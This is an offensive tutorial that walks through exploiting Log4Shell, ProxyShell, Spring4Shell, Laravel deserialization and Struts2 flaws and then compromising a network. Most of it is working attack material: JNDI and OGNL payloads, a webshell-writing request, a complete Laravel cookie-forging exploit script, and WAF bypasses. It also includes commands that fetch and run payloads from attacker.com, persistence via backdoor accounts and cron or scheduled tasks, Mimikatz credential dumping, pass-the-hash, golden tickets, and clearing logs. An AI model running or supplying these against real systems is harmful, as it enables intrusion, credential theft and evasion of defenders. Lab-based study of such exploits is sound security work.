# Complete Exploitation Methodologies: From Detection to Remote Code Execution

This guide provides comprehensive, step-by-step methodologies for exploiting critical web vulnerabilities, with real-world examples, exact commands, and detailed testing procedures using Burp Suite and other industry-standard tools.

---

## Table of Contents

1. [Log4Shell (CVE-2021-44228) - JNDI Injection](#log4shell)
2. [ProxyShell - Microsoft Exchange Triple Threat](#proxyshell)
3. [Spring4Shell (CVE-2022-22965) - Spring Framework RCE](#spring4shell)
4. [Laravel Deserialization RCE (CVE-2018-15133 & CVE-2021-3129)](#laravel)
5. [Struts2 S2-045/S2-046 (CVE-2017-5638) - Content-Type RCE](#struts2)
6. [Post-Exploitation & Lateral Movement](#postexploitation)

---

## 1. Log4Shell (CVE-2021-44228) - JNDI Injection {#log4shell}

### Vulnerability Overview

Log4Shell is one of the most critical remote code execution vulnerabilities ever discovered, affecting Apache Log4j 2 versions 2.0-beta9 through 2.14.1. The vulnerability allows attackers to execute arbitrary code by injecting JNDI (Java Naming and Directory Interface) lookups into log messages that get processed by vulnerable Log4j2 instances.

**Why this vulnerability is dangerous**: Log4j2 is ubiquitous in Java applications. When an attacker-controlled string like `${jndi:ldap://attacker.com/payload}` is logged, Log4j2 performs a JNDI lookup to fetch and execute code from the attacker's server.

**Real-world impact**: In December 2021, this vulnerability led to widespread exploitation across major platforms including Apple, Twitter, Steam, and countless enterprise systems. Attackers deployed ransomware, cryptocurrency miners, and backdoors within hours of disclosure.

### How the Exploit Chain Works

The exploitation process follows this sequence:

1. Attacker injects the payload `${jndi:ldap://ATTACKER_IP:1389/Exploit}` into any field that gets logged (User-Agent, X-Forwarded-For, POST parameters, etc.)
2. The vulnerable application logs this string using Log4j2
3. Log4j2 interprets `${jndi:...}` and performs a JNDI lookup via LDAP to the attacker's server
4. The attacker's LDAP server responds with a reference pointing to a malicious Java class hosted over HTTP
5. The victim JVM downloads and loads this class
6. The class executes, opening a reverse shell back to the attacker

### Complete Exploitation Steps

#### Step 1: Environment Setup

First, launch a vulnerable application for testing. The official vulnerable demo application is recommended:

```bash
# On Kali Linux attacker machine
docker run --rm -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app
```

#### Step 2: Prepare the Exploit Server (log4j-shell-poc)

Clone and run the Log4Shell proof-of-concept tool:

```bash
git clone https://github.com/kozmer/log4j-shell-poc.git
cd log4j-shell-poc
pip install -r requirements.txt

# Start the malicious LDAP + HTTP server
python poc.py --userip 192.168.1.4 --webport 8000 --lport 9001
```

**What this does**: The script starts an LDAP server on port 1389 and an HTTP server on port 8000. It automatically generates the malicious Java class that will give you a reverse shell.

#### Step 3: Start a Netcat Listener

Open another terminal to catch the reverse shell:

```bash
nc -nlvp 9001
```

#### Step 4: Test with cURL

Send the payload using curl to verify the vulnerability:

```bash
curl -X POST http://127.0.0.1:8080/ \
  -H 'X-Api-Version: ${jndi:ldap://192.168.1.4:1389/Exploit}'
```

Replace `192.168.1.4` with your Kali machine's IP address.

**Expected result**: Your Netcat listener should receive a connection, and you can execute commands like `id` to confirm RCE.

#### Step 5: Burp Suite Exploitation

For realistic testing against web applications, use Burp Suite:

**Configure Burp Proxy**:
1. Open Burp Suite → Proxy → Options
2. Ensure the proxy listener is running on `127.0.0.1:8080`
3. Configure Firefox to use this proxy (Settings → Network Settings → Manual proxy configuration)

**Capture and Modify Request**:

1. Navigate to `http://127.0.0.1:8080/` in your browser
2. In Burp, go to Proxy → Intercept and ensure Intercept is ON
3. Right-click the intercepted request and select "Send to Repeater"

**Inject the Payload**:

In Burp Repeater, add the malicious header:

```http
GET / HTTP/1.1
Host: 127.0.0.1:8080
X-Api-Version: ${jndi:ldap://192.168.1.4:1389/Exploit}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
```

Click "Send". The server will respond with a 400 error (this is normal), but your Netcat listener should receive a shell connection.

**Pro Tip**: The payload works in any HTTP header that gets logged. Common injection points include:
- `User-Agent`
- `X-Forwarded-For`
- `X-Real-IP`
- `Referer`
- `Cookie` values
- POST parameter values
- JSON body fields

#### Step 6: Advanced Payloads

For different scenarios, you can use alternative protocols:

```bash
# LDAP protocol (most common)
${jndi:ldap://attacker.com:1389/Exploit}

# RMI protocol
${jndi:rmi://attacker.com:1099/Exploit}

# DNS protocol (for blind detection)
${jndi:dns://attacker.com/callback}

# HTTP (if other ports blocked)
${jndi:http://attacker.com:8080/Exploit}
```

### Detection Testing Methodology

To systematically test for Log4Shell:

**Step 1 - Initial Detection**: Use a DNS-based payload to identify vulnerable endpoints without exploitation:

```
${jndi:dns://your-collaborator-domain.com/callback}
${jndi:ldap://your-collaborator-domain.com/callback}
```

**Step 2 - WAF Bypass**: If basic payloads are blocked, try obfuscation techniques:

```
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attacker.com/a}
${jndi:${lower:l}${lower:d}ap://attacker.com/a}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}
```

**Step 3 - All Injection Points**: Test every user-controllable input field including:
- All HTTP headers
- URL parameters
- POST body (JSON, XML, form data)
- Uploaded filenames
- Session cookies
- Authentication fields (username, password)

### Mitigation & Detection

**For defenders**: Update Log4j to version 2.17.0+ or set the system property `log4j2.formatMsgNoLookups=true`. Monitor for suspicious JNDI strings in logs.

---

## 2. ProxyShell - Microsoft Exchange Triple Threat {#proxyshell}

### Vulnerability Overview

ProxyShell is a chain of three vulnerabilities in Microsoft Exchange Server that together allow unauthenticated remote code execution with SYSTEM privileges:

- **CVE-2021-34473** - Pre-auth remote code execution (the critical one)
- **CVE-2021-34523** - Elevation of privilege
- **CVE-2021-31207** - Security bypass

**Why this is devastating**: An attacker can execute code as SYSTEM (the highest privilege level) on Exchange servers without any credentials. This gives complete control over email infrastructure and often leads to full domain compromise.

**Real-world impact**: In September-November 2021, the Iranian APT group "Phosphorus" (APT35) used ProxyShell to breach organizations and deploy BitLocker ransomware within 42 hours of initial access. The attackers performed reconnaissance, created backdoor accounts, established persistence via scheduled tasks, and finally encrypted drives demanding $8,000 ransoms.

### Complete Exploitation Steps

#### Step 1: Target Identification

First, identify if the target runs a vulnerable Exchange version. ProxyShell affects Exchange 2013, 2016, and 2019 (CU19 and earlier for 2019).

**Use Nmap to detect Exchange**:

```bash
nmap -p 443 --script http-title target.com
# Look for "Outlook Web App" or "Microsoft Exchange"

# Check version via HTTP response headers
curl -I https://target.com/owa/ | grep -i "microsoft-exchange"
```

#### Step 2: Use Automated Exploit Tool

The most reliable way to exploit ProxyShell is using an automated tool. The following process was observed in real attacks:

```bash
# Clone a ProxyShell exploit framework
git clone https://github.com/0xh4di/ProxyShell
cd ProxyShell
pip install -r requirements.txt

# Run exploit to get a webshell
python proxyshell.py -t https://target.com -u administrator@target.com
```

**What happens**: The exploit chain performs the following:
1. Bypasses authentication using CVE-2021-34473
2. Elevates privileges via CVE-2021-34523
3. Deploys a webshell to the server

#### Step 3: Verify Webshell Access

After successful exploitation, you'll receive a URL to the webshell:

```
Webshell URL: https://target.com/owa/auth/Shell.aspx
```

Test command execution:

```bash
curl -k "https://target.com/owa/auth/Shell.aspx?cmd=whoami"
# Output: nt authority\system
```

The shell runs as SYSTEM - the highest possible privilege.

#### Step 4: Establish Persistent Access

**Create a backdoor administrator account**:

```bash
# From the webshell or via command execution
net user backdoor Password123! /add
net localgroup administrators backdoor /add
net localgroup "Remote Desktop Users" backdoor /add
```

**Enable RDP access** if not already enabled:

```bash
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```

#### Step 5: Deploy C2 Beacon

Upload a C2 payload to maintain access:

```bash
# Upload via certutil (built into Windows)
certutil -urlcache -f http://attacker.com/shell.exe C:\Windows\Temp\shell.exe
C:\Windows\Temp\shell.exe
```

#### Step 6: Set Up SOCKS Proxy for Internal Access

Use Neo-reGeorg to tunnel traffic through the compromised server:

```bash
# Generate tunnel script (Python)
python neoreg.py generate -k your_secret_key

# This creates tunnel.aspx (for Exchange/.NET) - upload to web directory
# Upload tunnel.aspx to the Exchange server via webshell

# Connect to the tunnel
python neoreg.py -k your_secret_key -p 17194 -u https://target.com/owa/auth/tunnel.aspx
```

**Configure Proxifier** (GUI tool recommended for Windows):
1. Add proxy server: 127.0.0.1:17194 (SOCKS5)
2. Create rule: Application = mstsc.exe, Action = Proxy
3. Now you can RDP directly to internal IPs through the tunnel

### Information Gathering After Compromise

Once you have SYSTEM access, perform these enumeration commands:

```cmd
# System information
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

# Network configuration
ipconfig /all

# Domain information
net group "domain admins" /domain
net group "domain controllers" /domain

# Find Domain Controller IP
ping DC01.domain.local

# Process list (identify AV/EDR)
tasklist /SVC

# Active connections
netstat -ano
```

### Lateral Movement - Pass the Hash

After obtaining SYSTEM on the Exchange server, you can move to the Domain Controller:

**Dump credentials with Mimikatz**:

```bash
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > credentials.txt
```

**Pass the Hash to Domain Controller**:

```bash
# Using wmiexec (stealthier than psexec)
wmiexec.py -hashes :NTLM_HASH domain/administrator@DC_IP

# Example
wmiexec.py -hashes :c60b6f181a83cebd6d78d9279caf9d47 CORP/administrator@10.100.168.20
```

### Golden Ticket Attack

Once you have Domain Controller access, extract the krbtgt hash for persistence:

```bash
# On the Domain Controller
mimikatz.exe "lsadump::dcsync /user:corp\krbtgt" "exit"
```

**Create Golden Ticket**:

```bash
mimikatz.exe "kerberos::golden /admin:Administrator /domain:corp.local /sid:S-1-5-21-xxxx /krbtgt:HASH /ticket:ticket.kiribi" "exit"
```

**Use the ticket**:

```bash
# Load ticket into memory
mimikatz.exe "kerberos::ptt ticket.kiribi" "exit"

# Now you can access any resource as Domain Admin
dir \\DC01\c$
```

### Testing Methodology for ProxyShell

**Step 1 - Version Detection**:
```bash
curl -k https://target.com/owa/ | grep -i "OwaVersion"
curl -k https://target.com/ecp/ | grep -i "X-CalculatedBETarget"
```

**Step 2 - Manual Payload Test** (if avoiding automated tools):
```bash
# Test for autodiscover vulnerability
curl -k https://target.com/autodiscover/autodiscover.json?@test.com/ -X POST -H "Content-Type: application/json"
```

**Step 3 - Burp Suite Configuration** for manual exploitation:
1. Capture any request to the Exchange server
2. Modify the Host header to include the payload
3. Send to Intruder with different payload positions

---

## 3. Spring4Shell (CVE-2022-22965) - Spring Framework RCE {#spring4shell}

### Vulnerability Overview

Spring4Shell is a critical RCE vulnerability in Spring Framework versions 5.3.0 to 5.3.17 and 5.2.0 to 5.2.19, specifically when running on JDK 9+ and using Tomcat as the servlet container. The vulnerability allows attackers to write a webshell to the server by exploiting how Spring handles data binding with certain Java 9+ features.

**Why this is dangerous**: Spring is the most popular Java framework for web applications. The attack requires no authentication and leads to complete server compromise.

**Real-world impact**: After disclosure in March 2022, thousands of applications were patched under emergency timelines. Attackers scanned for vulnerable endpoints like `/greeting`, `/hello`, and any endpoint using `@RequestParam` with POJO binding.

### How the Exploit Works

The vulnerability exploits Spring's data binding feature when the server is running on JDK 9 or higher. Attackers can access internal Tomcat properties via the `class.module.classLoader` chain to write a JSP webshell.

The exploit uses a specific POST request that modifies Tomcat's pipeline configuration to inject a JSP file.

### Complete Exploitation Steps

#### Step 1: Set Up Vulnerable Target

```bash
git clone https://github.com/twseptian/cve-2022-22965.git
cd cve-2022-22965
docker build -t spring4shell-poc .
docker run -p 8080:8080 --name spring4shell-poc spring4shell-poc
```

The vulnerable application runs at `http://localhost:8080/spring-form/greeting`.

#### Step 2: Run the Exploit

```bash
# Download the exploit script
wget https://raw.githubusercontent.com/twseptian/cve-2022-22965/main/poc.py

# Execute against target
python3 poc.py --url http://172.17.0.2:8080/spring-form/greeting
```

**Successful output**:
```
Vulnerable, shell url: http://172.17.0.2:8080/tomcatwar.jsp?pwd=j&cmd=whoami
```

#### Step 3: Test the Webshell

```bash
curl "http://172.17.0.2:8080/tomcatwar.jsp?pwd=j&cmd=id"

# Response:
uid=0(root) gid=0(root) groups=0(root)
```

#### Step 4: Burp Suite Manual Exploitation

**Capture the request** in Burp Suite. The exploit sends a POST request with multiple parameters:

```http
POST /spring-form/greeting HTTP/1.1
Host: 172.17.0.2:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: 762

class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```

**To use in Burp Repeater**:
1. Send the request to Repeater
2. Modify the `cmd` parameter in the webshell URL after exploitation
3. Click Send to execute commands

#### Step 5: OWASP ZAP Scanning

For automated detection, OWASP ZAP can identify Spring4Shell:

1. Launch OWASP ZAP
2. Set target URL as the vulnerable application
3. Run Automated Scan
4. Review "High Risk" alerts - Spring4Shell should appear
5. Right-click the alert → "Show Response" to verify

### Detection Testing Methodology

**Step 1 - Check for Vulnerable Endpoints**:
Look for endpoints that accept Spring data binding - typically forms with multiple fields.

**Step 2 - Test with Basic Payload**:
```bash
# Send a request with suspicious parameters
curl -X POST http://target.com/form \
  -d "class.module.classLoader.URLs%5B0%5D=test"
```

**Step 3 - OWASP ZAP Active Scan**:
Configure ZAP to scan the application with the Spring4Shell detection rules.

**Step 4 - Burp Suite Detection**:
Use the "Spring4Shell Scanner" extension available in BApp Store.

### WAF Bypass Techniques

If a WAF blocks the standard exploit, try:
- URL encoding the parameters
- Using different case: `Class.Module.ClassLoader`
- Splitting the payload across multiple parameters

---

## 4. Laravel Deserialization RCE (CVE-2018-15133 & CVE-2021-3129) {#laravel}

### Vulnerability Overview

Laravel, a popular PHP framework, suffered from two critical deserialization RCE vulnerabilities. Both allow attackers to execute arbitrary code by sending specially crafted session cookies or exploiting the Ignition debug page.

**CVE-2018-15133**: Affects Laravel 5.5.40 and earlier, 5.6.0 to 5.6.29. The vulnerability exists because Laravel automatically deserializes encrypted session data without proper validation when the `APP_KEY` is known.

**CVE-2021-3129**: Affects Laravel with Ignition package (debug tool). Allows PHAR deserialization via the `/_ignition/execute-solution` endpoint, bypassing signature verification.

**Real-world impact**: These vulnerabilities have been exploited in numerous bug bounty programs and penetration tests. The CVE-2021-3129 exploit can execute commands even when the application is in production mode with debug disabled.

### How Laravel Session Deserialization Works

Laravel encrypts session data using AES-256-CBC with an `APP_KEY`. The encryption produces three components:
- **IV**: Random initialization vector (16 bytes)
- **Value**: The encrypted payload
- **MAC**: HMAC-SHA256 signature for integrity

If an attacker obtains the `APP_KEY` (often exposed in `.env` files, source code leaks, or backup files), they can encrypt their own malicious PHP object that will be deserialized when Laravel reads the session.

### Complete Exploitation Steps - CVE-2018-15133

#### Step 1: Obtain the APP_KEY

The `APP_KEY` is typically stored in the `.env` file and looks like `base64:abc123def456...`. Common ways to obtain it:
- Source code exposure (GitHub, backup files)
- Environment variable leaks via phpinfo()
- Laravel debug page exposure
- Backup files (.env.bak, .env.old)

#### Step 2: Use the Exploit Script

The following exploit script was used in real-world attacks:

```python
#!/usr/bin/env python3
# CVE-2018-15133 Laravel RCE Exploit
# Requires: phpggc installed at ./phpggc/phpggc

import subprocess
import base64
import json
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import hmac
import hashlib
import os

def generate_payload(app_key_base64, command, target_url):
    # Decode the APP_KEY
    if app_key_base64.startswith('base64:'):
        app_key_base64 = app_key_base64[7:]
    app_key = base64.b64decode(app_key_base64)
    
    # Generate PHPGGC payload
    phpggc_cmd = f"./phpggc/phpggc Laravel/RCE5 system '{command}' -b"
    result = subprocess.run(phpggc_cmd, shell=True, capture_output=True, text=True)
    serialized_payload = result.stdout.strip()
    
    # Generate random IV
    iv = os.urandom(16)
    
    # Encrypt the payload
    cipher = AES.new(app_key, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(serialized_payload.encode(), AES.block_size))
    
    # Combine IV + ciphertext for HMAC
    iv_b64 = base64.b64encode(iv).decode()
    value_b64 = base64.b64encode(encrypted).decode()
    message = iv_b64 + value_b64
    
    # Calculate HMAC
    mac = hmac.new(app_key, message.encode(), hashlib.sha256).hexdigest()
    
    # Build cookie payload
    cookie_payload = base64.b64encode(json.dumps({
        'iv': iv_b64,
        'value': value_b64,
        'mac': mac
    }).encode()).decode()
    
    # Send request
    cookies = {'laravel_session': cookie_payload}
    response = requests.get(target_url, cookies=cookies, verify=False)
    return response.text

# Usage
if __name__ == "__main__":
    # Command line: python exploit.py "base64:APP_KEY" "whoami" "http://target.com"
    import sys
    result = generate_payload(sys.argv[1], sys.argv[2], sys.argv[3])
    print(result)
```

**Run the exploit**:

```bash
python3 exploit.py "base64:dGhpc2lzYXNlY3JldGtleQ==" "id" "http://target.htb"
```

**Expected output**:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Complete Exploitation Steps - CVE-2021-3129 (Laravel Ignition)

This vulnerability is more common as it doesn't require the APP_KEY.

#### Step 1: Verify Vulnerability

The vulnerability exists in Laravel applications with Ignition package (typically installed as dev dependency but often left in production).

#### Step 2: Run Automated Exploit

```bash
git clone https://github.com/0x0d3ad/CVE-2021-3129.git
cd CVE-2021-3129
pip install requests

# Execute command
python3 CVE-2021-3129.py http://target.com --cmd 'id'
```

**What happens behind the scenes**:
1. The exploit generates a PHAR payload using phpggc
2. Sends a request to clear existing logs
3. Injects the payload into log files
4. Converts the log file to a PHAR archive
5. Triggers deserialization via the `/_ignition/execute-solution` endpoint
6. The command executes and output returns

#### Step 3: Manual Burp Suite Exploitation

**Step A - Capture the initial request**:

Send a GET request to the target and capture in Burp.

**Step B - Send to Repeater**:

Right-click → Send to Repeater

**Step C - Modify to POST to Ignition endpoint**:

```http
POST /_ignition/execute-solution HTTP/1.1
Host: target.com
Content-Type: application/json
Content-Length: 500

{
    "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
    "parameters": {
        "variableName": "test",
        "viewFile": "php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
    }
}
```

**Step D - Send the payload**:

Click Send and monitor for command execution.

### Detection Testing Methodology

**Test for APP_KEY Exposure**:
```bash
# Check common locations
curl http://target.com/.env
curl http://target.com/.env.bak
curl http://target.com/.git/config
curl http://target.com/phpinfo.php
```

**Test for Ignition Endpoint**:
```bash
# Check if debug endpoints are accessible
curl http://target.com/_ignition/health-check
curl http://target.com/_ignition/execute-solution
```

**Burp Suite Scanning**:
1. Install the "Laravel Ignition Scanner" extension from BApp Store
2. Configure to scan for both CVE-2018-15133 and CVE-2021-3129
3. Run active scan against target

---

## 5. Struts2 S2-045/S2-046 (CVE-2017-5638) - Content-Type RCE {#struts2}

### Vulnerability Overview

Apache Struts2 versions 2.3.5-2.3.31 and 2.5-2.5.10 contain a critical RCE vulnerability where attackers can inject OGNL (Object-Graph Navigation Language) expressions into the `Content-Type` header (S2-045) or the `filename` field (S2-046).

**Why this is devastating**: Struts2 powers thousands of enterprise applications. The vulnerability allows unauthenticated RCE and was used in the 2017 Equifax breach that exposed 147 million records.

**Real-world impact**: The Equifax breach was the direct result of this vulnerability not being patched. Attackers used it to execute commands on Equifax servers, eventually exfiltrating personal data of 147 million consumers.

### How the Exploit Works

The Jakarta multipart parser in Struts2 improperly handles the `Content-Type` header. When an invalid content type is provided, Struts2 attempts to parse an error message containing the attacker's OGNL expression, which gets evaluated by the OGNL interpreter.

### Complete Exploitation Steps

#### Step 1: Set Up Vulnerable Environment

```bash
# Using Vulhub
git clone https://github.com/vulhub/vulhub.git
cd vulhub/struts2/s2-045
docker-compose up -d
```

The environment runs at `http://localhost:8080`.

#### Step 2: Test for Vulnerability

**Using cURL**:

```bash
# Simple test - should return 404 but with Content-Type reflecting calculation
curl -v -X POST "http://localhost:8080/" \
  -H "Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test',1+99)}b" \
  --data-binary "test"
```

If vulnerable, the response headers will include `X-Test: 100`.

**Using Burp Suite**:

1. Configure Burp to intercept traffic to `http://localhost:8080`
2. Send any request to Repeater
3. Modify the `Content-Type` header:

```http
POST / HTTP/1.1
Host: localhost:8080
Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test',1+99)}b
Content-Length: 4

test
```

4. Click Send and check response headers for `X-Test: 100`

#### Step 3: Execute Commands (S2-045)

**Full command execution payload**:

```http
POST / HTTP/1.1
Host: target.com
Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}b
Content-Length: 4

test
```

**Modify the `#cmd` value** to execute different commands:
- `#cmd='whoami'` - Get current user
- `#cmd='id'` - Linux user info
- `#cmd='ls -la'` - Directory listing
- `#cmd='cat /etc/passwd'` - Read password file

#### Step 4: S2-046 Alternative (Filename-based)

S2-046 is essentially the same vulnerability but the payload goes in the `filename` parameter of a file upload. This variant requires null byte truncation.

**Burp Suite setup for S2-046**:

1. Capture a file upload request
2. Modify the `filename` value:

```http
POST /fileupload.action HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="%{#cmd='whoami'}.jsp"
Content-Type: text/plain

test
------WebKitFormBoundary--
```

3. **Important**: Add a null byte before the closing quote in hex view[citation]:
   - Switch to Hex tab in Burp
   - Find the space before `b` in the filename
   - Change the byte from `20` (space) to `00` (null)

#### Step 5: OWASP ZAP Automated Scanning

ZAP can detect Struts2 vulnerabilities:

1. Launch ZAP and configure target
2. Run "Automated Scan"
3. Review alerts - Struts2 RCE will appear as "High" risk
4. Use the "Attack" mode with Struts2 payloads

### WAF Bypass Techniques

If basic payloads are blocked, try these OGNL variations:

```java
// Use different OGNL context access
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))}

// Execute encoded command
%{(#cmd='echo d2hvYW1p|base64 -d|bash').(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())}
```

### Detection Testing Methodology

**Step 1 - Version Identification**:
```bash
curl -s http://target.com/struts2/version.txt 2>/dev/null
curl -s http://target.com/struts2/struts-tags.tld | grep "version"
```

**Step 2 - Passive Detection**:
Look for `Struts` in response headers or `.action`/`.do` URL patterns.

**Step 3 - Active Testing**:
Use Burp Intruder with a wordlist of OGNL expressions:
```
%{1+1}
${1+1}
#{1+1}
${#a=1}
%{#a=1}
```

**Step 4 - Verify Command Execution**:
Use time-based payloads to test without output:
```
%{#sleep(10)}
${#sleep(10)}
```

---

## 6. Post-Exploitation & Lateral Movement {#postexploitation}

Once RCE is achieved, follow this methodology for network compromise.

### Phase 1: Stabilize & Enumerate

**Initial commands to run**:

```bash
# Linux
whoami && id
uname -a
cat /etc/os-release
ip addr show
netstat -tulpn
ps aux
env
sudo -l
find / -type f -name "*.conf" 2>/dev/null | xargs grep -l "password"

# Windows
whoami
whoami /priv
systeminfo
ipconfig /all
netstat -ano
tasklist /v
set
net user
net localgroup administrators
```

### Phase 2: Establish Persistence

**Create backdoor accounts**:

```bash
# Windows
net user backdoor P@ssw0rd123! /add
net localgroup administrators backdoor /add
net localgroup "Remote Desktop Users" backdoor /add

# Linux
useradd -m -s /bin/bash .hidden
echo '.hidden:password123' | chpasswd
usermod -aG sudo .hidden
```

**Schedule tasks for persistence**:

```bash
# Windows - create scheduled task that runs every 5 minutes
schtasks /create /tn "SystemMaintenance" /tr "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/beacon.ps1')" /sc minute /mo 5 /ru "SYSTEM"

# Linux - cron persistence
(crontab -l 2>/dev/null; echo "*/5 * * * * curl -s http://attacker.com/beacon.sh | bash") | crontab -
```

### Phase 3: Credential Harvesting

**Dump credentials with Mimikatz**:

```bash
# On Windows (must be Administrator/SYSTEM)
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
```

**Extract hashes for Pass-the-Hash**:

```bash
# Using wmiexec (part of impacket)
wmiexec.py -hashes :NTLM_HASH domain/administrator@target_ip

# Example of lateral movement with hash
wmiexec.py -hashes :c60b6f181a83cebd6d78d9279caf9d47 CORP/administrator@10.100.168.20
```

### Phase 4: Lateral Movement

**Use PsExec or WMI for lateral movement**:

```bash
# Using impacket's psexec
psexec.py domain/administrator@target_ip -hashes :NTLM_HASH

# Using wmiexec (stealthier - no service creation)
wmiexec.py domain/administrator@target_ip -hashes :NTLM_HASH
```

**Deploy SOCKS proxy for network access**:

```bash
# On compromised host (using chisel)
# Attacker: ./chisel server -p 8000 --reverse
# Victim: ./chisel client attacker.com:8000 R:socks

# Then use proxychains
proxychains nmap -sT -Pn internal-network-range
```

### Phase 5: Clean Up

Remove logs and uploaded tools:

```bash
# Clear bash history
history -c
rm ~/.bash_history

# Clear Windows event logs
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

# Delete uploaded tools
del C:\Windows\Temp\*.exe
```

---

## Tools Reference

### Essential Tools Mentioned

| Tool | Purpose | Command/Location |
|------|---------|------------------|
| Burp Suite | Web proxy for exploitation | `burpsuite` |
| OWASP ZAP | Vulnerability scanning | `zaproxy` |
| Metasploit | Exploitation framework | `msfconsole` |
| Mimikatz | Credential harvesting | `mimikatz.exe` |
| impacket | Lateral movement | `wmiexec.py`, `psexec.py` |
| Neo-reGeorg | SOCKS tunneling | `python neoreg.py` |
| phpggc | PHP deserialization payloads | `./phpggc` |
| curl | HTTP request testing | `curl` |

### Online Resources

- **PayloadsAllTheThings** - Comprehensive payload collection
- **HackTricks** - Living hacking techniques repository
- **GTFOBins** - Unix privilege escalation binaries
- **RevShells.com** - Reverse shell payload generator
- **Exploit-DB** - Public exploit archive

---
